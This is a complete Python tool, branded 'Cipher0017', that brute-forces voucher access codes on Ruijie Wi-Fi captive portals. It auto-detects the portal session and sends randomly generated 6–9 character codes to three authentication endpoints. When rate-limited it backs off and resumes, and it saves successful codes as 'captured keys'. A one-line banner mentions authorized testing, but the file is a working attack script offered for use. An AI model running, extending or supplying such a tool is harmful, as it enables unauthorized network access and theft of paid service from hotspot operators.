import html
import json
import os
import random
import re
import sqlite3
import string
import time
from urllib.parse import parse_qs, urljoin, urlparse

import requests
from rich.align import Align
from rich.box import HEAVY, ROUNDED, SIMPLE
from rich.console import Console, Group
from rich.layout import Layout
from rich.live import Live
from rich.panel import Panel
from rich.prompt import Confirm, Prompt
from rich.table import Table
from rich.text import Text

DB_FILE = "scanner_data.db"
STATE_FILE = "scanner_state.json"
HITS_FILE = "hits.txt"

BASE_SLEEP_MIN = 0.25
BASE_SLEEP_MAX = 0.45
INITIAL_BLOCK_SLEEP = 15
MAX_BLOCK_SLEEP = 120
NETWORK_RETRY_SLEEP = 1.5
SESSION_REFRESH_SLEEP = 3
STATE_SAVE_INTERVAL = 25
MAX_URL_FAILURES = 3

VERIFY_SSL = True

if not VERIFY_SSL:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()
session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 10)"})

# ═══════════ THEME COLORS ═══════════
C_PRIMARY = "bright_cyan"
C_ACCENT = "bright_magenta"
C_SUCCESS = "bright_green"
C_WARN = "bright_yellow"
C_ERROR = "bright_red"
C_MUTED = "grey62"
C_TEXT = "bright_white"

MANUAL_PORTAL_URL = None
MANUAL_PORTAL_CTX = None
_AUTH_METHOD_CACHE = {}


def clear_screen():
    try:
        os.system("cls" if os.name == "nt" else "clear")
    except OSError:
        pass


def format_time(seconds):
    try:
        total_seconds = max(0, int(seconds))
        hours = total_seconds // 3600
        minutes = (total_seconds % 3600) // 60
        secs = total_seconds % 60
        return f"{hours:02d}:{minutes:02d}:{secs:02d}"
    except (TypeError, ValueError):
        return "00:00:00"


def normalize_hits(hits):
    if not hits:
        return []
    result = []
    for item in hits:
        if isinstance(item, dict):
            result.append({
                "code": str(item.get("code", "")),
                "time": str(item.get("time", "--:--:--")),
            })
        elif isinstance(item, str):
            result.append({"code": item, "time": "--:--:--"})
    return result


def hits_codes_only(hits):
    return [h.get("code") if isinstance(h, dict) else h for h in hits]


def init_db():
    try:
        conn = sqlite3.connect(DB_FILE, timeout=10)
        conn.execute("CREATE TABLE IF NOT EXISTS tried_codes (code TEXT PRIMARY KEY)")
        conn.commit()
        return conn
    except sqlite3.Error as exc:
        console.print(f"[{C_ERROR}]Database init error: {exc}[/{C_ERROR}]")
        return None


def is_tried(conn, code):
    if conn is None:
        return False
    try:
        row = conn.execute("SELECT 1 FROM tried_codes WHERE code = ?", (code,)).fetchone()
        return row is not None
    except sqlite3.Error:
        return False


def mark_tried(conn, code):
    if conn is None:
        return
    try:
        conn.execute("INSERT OR IGNORE INTO tried_codes (code) VALUES (?)", (code,))
        conn.commit()
    except sqlite3.Error:
        pass


def load_state():
    if not os.path.exists(STATE_FILE):
        return None
    try:
        with open(STATE_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if not isinstance(data, dict) or "mode" not in data:
            return None
        return data
    except (OSError, json.JSONDecodeError):
        return None


def save_state(mode, tested, hits):
    tmp_file = f"{STATE_FILE}.tmp"
    payload = {"mode": mode, "tested": tested, "hits": hits}
    try:
        with open(tmp_file, "w", encoding="utf-8") as f:
            json.dump(payload, f, ensure_ascii=False, indent=2)
        os.replace(tmp_file, STATE_FILE)
    except OSError:
        try:
            if os.path.exists(tmp_file):
                os.remove(tmp_file)
        except OSError:
            pass


def clear_state():
    for path in (STATE_FILE, f"{STATE_FILE}.tmp"):
        try:
            if os.path.exists(path):
                os.remove(path)
        except OSError:
            pass


def parse_portal_context(raw_url, body_text=""):
    if not raw_url:
        return None, None
    unescaped = html.unescape(str(raw_url))
    parsed = urlparse(unescaped)
    if not parsed.scheme or not parsed.netloc:
        return None, None

    allowed_domains = ("portal-as.ruijienetworks.com", "portal-mm-as.ruijienetworks.com")
    if not any(domain in parsed.netloc for domain in allowed_domains):
        return None, None

    portal_base = f"{parsed.scheme}://{parsed.netloc}"
    params = {}
    for k, vals in parse_qs(parsed.query).items():
        if vals:
            params[k] = vals[0]

    for key in ("sessionId", "sessionid", "sid", "token", "gw_id", "gw_sn", "ip", "mac",
                "chap_id", "chap_challenge", "stage", "gw_address", "gw_port",
                "slot_num", "nasip", "ssid", "ustate", "mac_req", "url", "timestamp", "sign"):
        if key not in params and body_text:
            m = re.search(rf"{re.escape(key)}=([^\s&'\"<>]+)", html.unescape(body_text), re.IGNORECASE)
            if m:
                params[key] = m.group(1)

    sid = (
        params.get("sessionId") or params.get("sessionid") or params.get("sid")
        or params.get("token") or params.get("chap_challenge") or params.get("gw_id")
    )
    if not sid and params:
        sid = "wifidog_ctx"
    if not sid:
        return None, None

    context = {
        "portal_base": portal_base,
        "portal_url": unescaped,
        "session_id": sid,
        "params": params,
        "is_new_format": "portal-as.ruijienetworks.com" in parsed.netloc,
    }
    return portal_base, context


def fetch_session():
    probes = [
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://captive.apple.com/hotspot-detect.html",
    ]
    for probe_url in probes:
        try:
            resp = session.get(probe_url, timeout=6, allow_redirects=True, verify=VERIFY_SSL)
        except requests.RequestException:
            continue

        candidates = [resp.url]
        for hist in resp.history:
            loc = hist.headers.get("Location", "")
            if loc:
                candidates.append(urljoin(hist.url, loc))
            candidates.append(hist.url)

        for cand in candidates:
            portal_base, ctx = parse_portal_context(cand, resp.text or "")
            if portal_base and ctx:
                return portal_base, ctx

        meta_match = re.search(r"url=([^'\"&\s>]+)", resp.text or "", re.IGNORECASE)
        if meta_match:
            portal_base, ctx = parse_portal_context(resp.url, resp.text or "")
            if portal_base and ctx:
                return portal_base, ctx

        redirect_match = re.search(
            r"(?:self|window)\.location\.href\s*=\s*['\"]([^'\"]+)['\"]", resp.text or ""
        )
        if redirect_match:
            next_url = urljoin(resp.url, redirect_match.group(1))
            try:
                resp2 = session.get(next_url, timeout=6, allow_redirects=True, verify=VERIFY_SSL)
                portal_base, ctx = parse_portal_context(resp2.url, resp2.text or "")
                if portal_base and ctx:
                    return portal_base, ctx
            except requests.RequestException:
                pass

    return None, None


# ═══════════════════════════════════════════════════════════════
# 🔐 AUTH STRATEGIES
# ═══════════════════════════════════════════════════════════════

def _auth_voucher_json(portal_base, ctx, code, headers):
    params = ctx.get("params", {})
    payload = {
        "accessCode": code,
        "sessionId": ctx.get("session_id", ""),
        "gwId": params.get("gw_id", ""),
        "gwSn": params.get("gw_sn", ""),
        "ip": params.get("ip", ""),
        "mac": params.get("mac", ""),
        "chapId": params.get("chap_id", ""),
        "chapChallenge": params.get("chap_challenge", ""),
        "apiVersion": 1,
        "authCode": "ABCD",
    }
    h = {**headers, "Content-Type": "application/json"}
    return session.post(
        f"{portal_base}/api/auth/voucher/?lang=en_US",
        json=payload, headers=h, timeout=6, verify=VERIFY_SSL,
    )


def _auth_wifidog_post(portal_base, ctx, code, headers):
    params = dict(ctx.get("params", {}))
    params["accessCode"] = code
    return session.post(
        f"{portal_base}/api/auth/wifidog",
        params=params,
        data={"accessCode": code, "stage": "auth"},
        headers=headers, timeout=6, verify=VERIFY_SSL,
    )


def _auth_wifidog_get(portal_base, ctx, code, headers):
    params = dict(ctx.get("params", {}))
    params["accessCode"] = code
    return session.get(
        f"{portal_base}/api/auth/wifidog",
        params=params, headers=headers, timeout=6, verify=VERIFY_SSL,
    )


AUTH_METHODS = {
    "voucher_json": _auth_voucher_json,
    "wifidog_post": _auth_wifidog_post,
    "wifidog_get": _auth_wifidog_get,
}
AUTH_ORDER = ["voucher_json", "wifidog_post", "wifidog_get"]


def test_code(portal_base, ctx, code):
    referer = ctx.get("portal_url", portal_base) if isinstance(ctx, dict) else portal_base
    headers = {"Origin": portal_base, "Referer": referer}

    cached = _AUTH_METHOD_CACHE.get(portal_base)
    order = [cached] + [m for m in AUTH_ORDER if m != cached] if cached else list(AUTH_ORDER)

    last_error = "__URL_ERROR_404__"

    for method_name in order:
        fn = AUTH_METHODS[method_name]
        try:
            resp = fn(portal_base, ctx, code, headers)
        except requests.ConnectionError:
            return "__URL_ERROR__"
        except requests.RequestException:
            return "__NETWORK_ERROR__"

        if resp.status_code == 404:
            last_error = "__URL_ERROR_404__"
            continue
        if resp.status_code == 429:
            return "__RATE_LIMITED__"
        if resp.status_code >= 500:
            last_error = f"__URL_ERROR_{resp.status_code}__"
            continue

        _AUTH_METHOD_CACHE[portal_base] = method_name
        return resp.text or "__EMPTY_RESPONSE__"

    return last_error


def gen_code(mode, length):
    if length <= 0:
        return ""
    if mode == "num":
        return str(random.randint(0, 10**length - 1)).zfill(length)
    if mode == "eng":
        return "".join(random.choices(string.ascii_lowercase, k=length))
    if mode == "mix":
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return ""


# ═══════════════════════════════════════════════════════════════
# 🎨 NEW DESIGN — Cipher0017 theme
# ═══════════════════════════════════════════════════════════════

def _brand_header():
    title = Text()
    title.append("⚡ ", style=f"bold {C_ACCENT}")
    title.append("C", style=f"bold {C_PRIMARY}")
    title.append("i", style=f"bold {C_ACCENT}")
    title.append("p", style=f"bold {C_PRIMARY}")
    title.append("h", style=f"bold {C_ACCENT}")
    title.append("e", style=f"bold {C_PRIMARY}")
    title.append("r", style=f"bold {C_ACCENT}")
    title.append("0", style=f"bold {C_SUCCESS}")
    title.append("0", style=f"bold {C_SUCCESS}")
    title.append("1", style=f"bold {C_SUCCESS}")
    title.append("7", style=f"bold {C_SUCCESS}")
    title.append(" ⚡", style=f"bold {C_ACCENT}")
    title.justify = "center"

    sub = Text("◇  CIPHER ENGINE v2.0  ◇", style=f"dim italic {C_MUTED}", justify="center")
    return Group(Align.center(title), Align.center(sub))


def make_layout(mode_name, current_code, tested, elapsed, status, hits, running_logs, url_mode):
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=5),
        Layout(name="stats", size=3),
        Layout(name="body", ratio=1),
    )

    # ── HEADER ──
    layout["header"].update(
        Panel(
            _brand_header(),
            border_style=C_PRIMARY,
            box=HEAVY,
            padding=(0, 2),
        )
    )

    # ── STATS BAR ──
    stats = Table.grid(padding=0, expand=True)
    stats.add_column(ratio=3, justify="center")
    stats.add_column(ratio=2, justify="center")
    stats.add_column(ratio=2, justify="center")
    stats.add_column(ratio=2, justify="center")

    code_disp = current_code if current_code else "─────"
    stats.add_row(
        Panel(
            Align.center(Text(code_disp, style=f"bold {C_SUCCESS}")),
            title=f"[{C_MUTED}]⏣ CODE[/{C_MUTED}]",
            border_style=C_SUCCESS,
            box=ROUNDED,
            padding=(0, 1),
        ),
        Panel(
            Align.center(Text(elapsed, style=f"bold {C_PRIMARY}")),
            title=f"[{C_MUTED}]⏱ TIME[/{C_MUTED}]",
            border_style=C_PRIMARY,
            box=ROUNDED,
            padding=(0, 1),
        ),
        Panel(
            Align.center(Text(f"{tested:,}", style=f"bold {C_WARN}")),
            title=f"[{C_MUTED}]⬢ TESTED[/{C_MUTED}]",
            border_style=C_WARN,
            box=ROUNDED,
            padding=(0, 1),
        ),
        Panel(
            Align.center(Text(status, style=f"bold {C_ACCENT}")),
            title=f"[{C_MUTED}]◉ STATE[/{C_MUTED}]",
            border_style=C_ACCENT,
            box=ROUNDED,
            padding=(0, 1),
        ),
    )
    layout["stats"].update(stats)

    # ── BODY (split: logs | hits) ──
    body = Layout()
    body.split_row(
        Layout(name="logs", ratio=3),
        Layout(name="side", ratio=2),
    )

    # ── LOGS PANEL ──
    log_table = Table(show_header=False, expand=True, box=None, padding=(0, 1))
    log_table.add_column("Logs")
    for lg in running_logs[-12:]:
        log_table.add_row(lg)
    if not running_logs:
        log_table.add_row(f"[dim {C_MUTED}]▸ awaiting first ping...[/dim {C_MUTED}]")

    body["logs"].update(
        Panel(
            log_table,
            title=f"[bold {C_PRIMARY}]▰▰ CIPHER FEED ▰▰[/bold {C_PRIMARY}]",
            border_style=C_PRIMARY,
            box=ROUNDED,
            padding=(0, 1),
        )
    )

    # ── SIDE PANEL (hits) ──
    hits_table = Table(
        show_header=True,
        header_style=f"bold {C_ACCENT}",
        expand=True,
        box=SIMPLE,
        padding=(0, 1),
    )
    hits_table.add_column("#", width=3, justify="right", style=C_MUTED)
    hits_table.add_column("KEY", justify="left")
    hits_table.add_column("TIME", width=8, justify="center", style=C_MUTED)

    last_hits = hits[-8:]
    for idx, item in enumerate(last_hits, 1):
        if isinstance(item, dict):
            c = item.get("code", "")
            t = item.get("time", "--:--:--")
        else:
            c = str(item)
            t = "--:--:--"
        hits_table.add_row(str(idx), f"[bold {C_SUCCESS}]◆ {c}[/bold {C_SUCCESS}]", t)

    if not last_hits:
        hits_table.add_row("", f"[dim {C_MUTED}]no keys captured[/dim {C_MUTED}]", "")

    hits_title = f"[bold {C_SUCCESS}]◈ CAPTURED KEYS ◈[/bold {C_SUCCESS}] [dim]({len(hits)})[/dim]"

    url_line = (
        f"[{C_SUCCESS}]◈ MANUAL[/{C_SUCCESS}]" if url_mode == "manual"
        else f"[{C_MUTED}]◈ AUTO[/{C_MUTED}]"
    )
    mode_line = f"[dim {C_MUTED}]mode:[/dim {C_MUTED}] [{C_TEXT}]{mode_name}[/{C_TEXT}]  {url_line}"

    side_content = Group(
        hits_table,
        Text(""),
        Align.center(Text.from_markup(mode_line)),
    )

    body["side"].update(
        Panel(
            side_content,
            title=hits_title,
            border_style=C_SUCCESS,
            box=ROUNDED,
            padding=(0, 1),
        )
    )

    layout["body"].update(body)
    return layout


# ═══════════════════════════════════════════════════════════════
# ▶ SCAN LOOP
# ═══════════════════════════════════════════════════════════════

def scan_loop(mode, length, start_tested=0, start_hits=None):
    mode_str = f"{mode}_{length}"
    mode_name = f"{mode.upper()}-{length}"

    hits = normalize_hits(start_hits) if start_hits else []
    running_logs = []
    tested = start_tested
    start_time = time.time()

    manual_available = bool(MANUAL_PORTAL_URL and MANUAL_PORTAL_CTX)
    manual_fail_count = 0
    MAX_MANUAL_FAILURES = 10

    portal_base = MANUAL_PORTAL_URL
    portal_ctx = MANUAL_PORTAL_CTX

    net_error_streak = 0
    url_error_streak = 0
    block_streak = 0
    since_last_save = 0

    conn = init_db()
    live = None
    live_cm = None

    def _url_mode():
        return "manual" if (portal_base and portal_base == MANUAL_PORTAL_URL) else "auto"

    try:
        initial = make_layout(mode_name, "─────", tested, "00:00:00", "IDLE",
                              hits, running_logs, _url_mode())
        live_cm = Live(initial, refresh_per_second=8, screen=True)
        live = live_cm.__enter__()
    except Exception:
        live = None
        live_cm = None

    def _update(code, status):
        if live is None:
            return
        try:
            live.update(
                make_layout(mode_name, code, tested, format_time(time.time() - start_time),
                            status, hits, running_logs, _url_mode())
            )
        except Exception:
            pass

    def push_log(msg):
        t_str = time.strftime("%H:%M:%S")
        running_logs.append(f"[{C_MUTED}]{t_str}[/{C_MUTED}] {msg}")

    try:
        push_log(f"[bold {C_ACCENT}]Cipher engine online.[/bold {C_ACCENT}]")
        if manual_available:
            gw = portal_ctx.get("params", {}).get("gw_id", "?")
            push_log(f"[{C_SUCCESS}]▸ target locked[/{C_SUCCESS}] [dim]gw_id={gw}[/dim]")

        while True:
            try:
                if not portal_ctx or not portal_base:
                    _update("─────", "SCANNING")

                    if manual_available and manual_fail_count < MAX_MANUAL_FAILURES:
                        portal_base = MANUAL_PORTAL_URL
                        portal_ctx = MANUAL_PORTAL_CTX
                        manual_fail_count += 1
                        if manual_fail_count > 1:
                            push_log(f"[{C_WARN}]▸ retry manual ({manual_fail_count}/{MAX_MANUAL_FAILURES})[/{C_WARN}]")
                    else:
                        if manual_available:
                            push_log(f"[{C_WARN}]▸ manual exhausted, switching to auto[/{C_WARN}]")
                            manual_available = False
                        portal_base, portal_ctx = fetch_session()
                        if not portal_ctx or not portal_base:
                            push_log(f"[{C_WARN}]▸ portal not found, retrying...[/{C_WARN}]")
                            time.sleep(SESSION_REFRESH_SLEEP)
                            continue
                        gw_id = portal_ctx.get("params", {}).get("gw_id", "")
                        fmt = "NEW" if portal_ctx.get("is_new_format") else "OLD"
                        push_log(f"[{C_SUCCESS}]▸ portal ready[/{C_SUCCESS}] [dim]({fmt}) {gw_id or 'ctx'}[/dim]")

                    net_error_streak = 0
                    url_error_streak = 0

                code = gen_code(mode, length)
                if not code:
                    time.sleep(BASE_SLEEP_MIN)
                    continue

                if is_tried(conn, code):
                    continue

                mark_tried(conn, code)
                tested += 1
                since_last_save += 1
                if since_last_save >= STATE_SAVE_INTERVAL:
                    save_state(mode_str, tested, hits)
                    since_last_save = 0

                push_log(f"[{C_MUTED}]→[/{C_MUTED}] try [bold {C_WARN}]{code}[/bold {C_WARN}]")
                _update(code, "SCANNING")

                res = test_code(portal_base, portal_ctx, code)
                low = (res or "").lower()

                if res == "__URL_ERROR__" or (res or "").startswith("__URL_ERROR_"):
                    url_error_streak += 1
                    push_log(f"[{C_ERROR}]✕ url error ({res})[/{C_ERROR}]")
                    portal_ctx = None
                    if url_error_streak >= MAX_URL_FAILURES:
                        portal_base = None
                        url_error_streak = 0
                        time.sleep(SESSION_REFRESH_SLEEP)
                    else:
                        time.sleep(NETWORK_RETRY_SLEEP)
                    continue

                if res in ("__NETWORK_ERROR__", "__EMPTY_RESPONSE__"):
                    net_error_streak += 1
                    push_log(f"[{C_WARN}]⚠ net issue ({net_error_streak})[/{C_WARN}]")
                    time.sleep(NETWORK_RETRY_SLEEP)
                    if net_error_streak >= 6:
                        portal_ctx = None
                        portal_base = None
                        net_error_streak = 0
                    continue

                net_error_streak = 0
                url_error_streak = 0

                if (res == "__RATE_LIMITED__" or "request limited" in low or "blocked" in low
                        or "too many" in low or '"limit"' in low):
                    block_streak += 1
                    guard_sleep = min(MAX_BLOCK_SLEEP, INITIAL_BLOCK_SLEEP * (2 ** (block_streak - 1)))
                    _update(code, "GUARD")
                    push_log(f"[{C_ERROR}]⛔ block #{block_streak} — cooling {guard_sleep}s[/{C_ERROR}]")
                    save_state(mode_str, tested, hits)
                    since_last_save = 0
                    portal_ctx = None
                    time.sleep(guard_sleep)
                    continue

                if ("session timed out" in low or "session timeout" in low
                        or '"session":null' in low):
                    push_log(f"[{C_WARN}]⏳ session expired, refreshing[/{C_WARN}]")
                    portal_ctx = None
                    continue

                success_indicators = [
                    '"success":true', '"authresult":"1"',
                    "auth: 1", "auth:1", '"auth":1',
                    '"result":"ok"', '"code":0',
                ]
                if any(ind in low for ind in success_indicators):
                    block_streak = 0
                    existing = hits_codes_only(hits)
                    if code not in existing:
                        now = time.strftime("%H:%M:%S")
                        hits.append({"code": code, "time": now})
                        push_log(f"[bold {C_SUCCESS}]★ KEY CAPTURED → {code}[/bold {C_SUCCESS}]")
                        try:
                            with open(HITS_FILE, "a", encoding="utf-8") as f:
                                f.write(f"[{now}] CODE: {code}\n")
                        except OSError as exc:
                            push_log(f"[{C_ERROR}]✕ save failed: {exc}[/{C_ERROR}]")
                        save_state(mode_str, tested, hits)
                        since_last_save = 0
                    _update(code, "SCANNING")
                    time.sleep(BASE_SLEEP_MIN)
                    continue

                if block_streak > 0 and tested % 10 == 0:
                    block_streak = max(0, block_streak - 1)

                backoff_extra = min(1.5, block_streak * 0.35)
                time.sleep(BASE_SLEEP_MIN + backoff_extra + random.uniform(0, BASE_SLEEP_MAX - BASE_SLEEP_MIN))

            except KeyboardInterrupt:
                raise
            except Exception as exc:
                push_log(f"[{C_ERROR}]✕ recovered: {exc}[/{C_ERROR}]")
                portal_ctx = None
                time.sleep(NETWORK_RETRY_SLEEP)

    except KeyboardInterrupt:
        push_log(f"[{C_WARN}]⏹ stopped by user[/{C_WARN}]")
    finally:
        save_state(mode_str, tested, hits)
        if live_cm is not None:
            try:
                live_cm.__exit__(None, None, None)
            except Exception:
                pass
        if conn is not None:
            try:
                conn.close()
            except sqlite3.Error:
                pass


# ═══════════════════════════════════════════════════════════════
# MENUS
# ═══════════════════════════════════════════════════════════════

def show_banner():
    clear_screen()

    # Big Cipher0017 logo
    logo = Text()
    logo.append("\n")
    logo.append("  ╔═╗╦╔═╗╦ ╦╔═╗╦═╗  ╔═╗╔═╗╦╔═╗╔═╗", style=f"bold {C_PRIMARY}")
    logo.append("\n")
    logo.append("  ║  ║╠═╝╠═╣║╣ ╠╦╝  ║ ║║ ║║║╣ ╚═╗", style=f"bold {C_ACCENT}")
    logo.append("\n")
    logo.append("  ╚═╝╩╩  ╩ ╩╚═╝╩╚═  ╚═╝╚═╝╩╚═╝╚═╝", style=f"bold {C_PRIMARY}")
    logo.append("\n")
    logo.justify = "center"

    console.print(Panel(
        Align.center(logo),
        border_style=C_PRIMARY,
        box=HEAVY,
        padding=(0, 2),
    ))
    console.print()
    console.print(Align.center(
        Text("◇  C I P H E R  E N G I N E  ·  v2.0  ◇",
             style=f"bold {C_ACCENT}")
    ))
    console.print()
    console.print(Align.center(
        Text("⚠  use only on networks you are authorized to test  ⚠",
             style=f"dim {C_WARN}")
    ))
    console.print()


def prompt_url_input():
    global MANUAL_PORTAL_URL, MANUAL_PORTAL_CTX

    clear_screen()
    console.print(Panel(
        Align.center(Text("🔗  LINK TARGET PORTAL", style=f"bold {C_WARN}")),
        border_style=C_WARN, box=HEAVY, padding=(0, 2),
    ))
    console.print()
    console.print(f"[{C_MUTED}]paste the wifidog portal URL from your browser:[/{C_MUTED}]")
    console.print(f"[dim]  https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&...[/dim]")
    console.print()
    console.print(f"[{C_MUTED}]leave blank to switch back to auto-detect[/{C_MUTED}]")
    console.print()

    url = Prompt.ask(f"[bold {C_PRIMARY}]➜ URL[/bold {C_PRIMARY}]").strip()

    if not url:
        MANUAL_PORTAL_URL = None
        MANUAL_PORTAL_CTX = None
        console.print(f"[{C_WARN}]▸ cleared — auto-detect active[/{C_WARN}]")
        time.sleep(1.2)
        return False

    if not url.lower().startswith("http"):
        url = "https://" + url

    base, ctx = parse_portal_context(url, "")
    if base and ctx:
        MANUAL_PORTAL_URL = base
        MANUAL_PORTAL_CTX = ctx
        gw_id = ctx.get("params", {}).get("gw_id", "?")
        gw_sn = ctx.get("params", {}).get("gw_sn", "?")
        console.print(f"[{C_SUCCESS}]✓ target linked[/{C_SUCCESS}]")
        console.print(f"[dim]  gw_id : {gw_id}[/dim]")
        console.print(f"[dim]  gw_sn : {gw_sn}[/dim]")
        time.sleep(1.8)
        return True

    console.print(f"[{C_ERROR}]✕ invalid URL — must be Ruijie wifidog format[/{C_ERROR}]")
    time.sleep(2)
    return False


def ask_mode():
    while True:
        show_banner()

        # Status chip
        if MANUAL_PORTAL_URL:
            short = MANUAL_PORTAL_URL[:48] + ("..." if len(MANUAL_PORTAL_URL) > 48 else "")
            console.print(Panel(
                Align.center(Text(f"🔗  {short}", style=f"bold {C_SUCCESS}")),
                border_style=C_SUCCESS, box=ROUNDED,
            ))
        else:
            console.print(Panel(
                Align.center(Text("🔗  auto-detect", style=f"dim {C_MUTED}")),
                border_style=C_MUTED, box=ROUNDED,
            ))
        console.print()

        menu = Text()
        menu.append("  ╭─ SELECT MODE ─────────────╮\n", style=C_MUTED)
        menu.append("  │ ", style=C_MUTED)
        menu.append("[1]", style=f"bold {C_PRIMARY}")
        menu.append("  ⬢ NUM   ", style=C_TEXT)
        menu.append("(digits only)     ", style=f"dim {C_MUTED}")
        menu.append("│\n", style=C_MUTED)
        menu.append("  │ ", style=C_MUTED)
        menu.append("[2]", style=f"bold {C_PRIMARY}")
        menu.append("  ⬡ ENG   ", style=C_TEXT)
        menu.append("(lowercase a-z)   ", style=f"dim {C_MUTED}")
        menu.append("│\n", style=C_MUTED)
        menu.append("  │ ", style=C_MUTED)
        menu.append("[3]", style=f"bold {C_PRIMARY}")
        menu.append("  ◆ MIX   ", style=C_TEXT)
        menu.append("(a-z + 0-9)       ", style=f"dim {C_MUTED}")
        menu.append("│\n", style=C_MUTED)
        menu.append("  │ ", style=C_MUTED)
        menu.append("[4]", style=f"bold {C_WARN}")
        menu.append("  🔗 URL  ", style=C_TEXT)
        menu.append("(set portal link) ", style=f"dim {C_MUTED}")
        menu.append("│\n", style=C_MUTED)
        menu.append("  │ ", style=C_MUTED)
        menu.append("[0]", style=f"bold {C_ERROR}")
        menu.append("  ⏻ EXIT                    ", style=C_TEXT)
        menu.append("│\n", style=C_MUTED)
        menu.append("  ╰───────────────────────────╯", style=C_MUTED)

        console.print(Panel(menu, border_style=C_PRIMARY, box=HEAVY))
        choice = Prompt.ask(f"[bold {C_PRIMARY}]➜ select[/bold {C_PRIMARY}]").strip()

        if choice == "0":
            return None
        if choice == "4":
            prompt_url_input()
            continue
        if choice not in ("1", "2", "3"):
            console.print(f"[{C_ERROR}]✕ invalid — choose 0-4[/{C_ERROR}]")
            time.sleep(1.2)
            continue
        return {"1": "num", "2": "eng", "3": "mix"}[choice]


def ask_length(mode):
    while True:
        clear_screen()
        console.print(Panel(
            Align.center(Text(f"⬢  MODE: {mode.upper()}", style=f"bold {C_ACCENT}")),
            border_style=C_ACCENT, box=HEAVY, padding=(0, 2),
        ))
        console.print()

        menu = Text()
        menu.append("  ╭─ SELECT KEY LENGTH ────────╮\n", style=C_MUTED)
        for i in range(6, 10):
            menu.append("  │ ", style=C_MUTED)
            menu.append(f"[{i}]", style=f"bold {C_PRIMARY}")
            menu.append(f"  {i} characters           ", style=C_TEXT)
            menu.append("│\n", style=C_MUTED)
        menu.append("  │ ", style=C_MUTED)
        menu.append("[0]", style=f"bold {C_ERROR}")
        menu.append("  back                       ", style=C_TEXT)
        menu.append("│\n", style=C_MUTED)
        menu.append("  ╰────────────────────────────╯", style=C_MUTED)

        console.print(Panel(menu, border_style=C_PRIMARY, box=HEAVY))
        console.print()
        console.print(Align.center(
            Text("◆ larger keyspace = exponentially longer scan ◆",
                 style=f"dim italic {C_MUTED}")
        ))
        console.print()

        length = Prompt.ask(f"[bold {C_PRIMARY}]➜ length[/bold {C_PRIMARY}]").strip()

        if length == "0":
            return None
        if length not in ("6", "7", "8", "9"):
            console.print(f"[{C_ERROR}]✕ invalid — choose 6-9 or 0[/{C_ERROR}]")
            time.sleep(1.2)
            continue
        return int(length)


# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════

def run():
    state = load_state()
    if state:
        try:
            mode_part, len_part = str(state["mode"]).split("_", 1)
            tested = int(state.get("tested", 0))
            hits = normalize_hits(state.get("hits", []))

            clear_screen()
            console.print(Panel(
                Align.center(Text("💾  SAVED SESSION", style=f"bold {C_WARN}")),
                border_style=C_WARN, box=HEAVY, padding=(0, 2),
            ))
            console.print()

            info = Text()
            info.append("  ◈ mode    : ", style=C_MUTED)
            info.append(f"{mode_part.upper()}-{len_part}\n", style=f"bold {C_TEXT}")
            info.append("  ◈ tested  : ", style=C_MUTED)
            info.append(f"{tested:,}\n", style=f"bold {C_TEXT}")
            info.append("  ◈ hits    : ", style=C_MUTED)
            info.append(f"{len(hits)}\n", style=f"bold {C_SUCCESS}")
            console.print(Panel(info, border_style=C_SUCCESS, box=ROUNDED, padding=(0, 1)))
            console.print()

            if Confirm.ask(f"[bold {C_WARN}]➜ resume from save?[/bold {C_WARN}]", default=True):
                scan_loop(mode_part, int(len_part), start_tested=tested, start_hits=hits)
                return
            clear_state()
        except (ValueError, TypeError):
            clear_state()

    while True:
        mode = ask_mode()
        if mode is None:
            return
        length = ask_length(mode)
        if length is None:
            continue
        scan_loop(mode, length)
        return


def main():
    try:
        run()
    except KeyboardInterrupt:
        pass
    finally:
        clear_screen()
        bye = Text()
        bye.append("\n\n")
        bye.append("  ⚡ Cipher0017  ", style=f"bold {C_PRIMARY}")
        bye.append("·  ", style=C_MUTED)
        bye.append("session closed", style=f"dim {C_TEXT}")
        bye.append("  ⚡\n\n", style=f"bold {C_PRIMARY}")
        bye.justify = "center"
        console.print(Align.center(bye))
        time.sleep(1.5)


if __name__ == "__main__":
    main()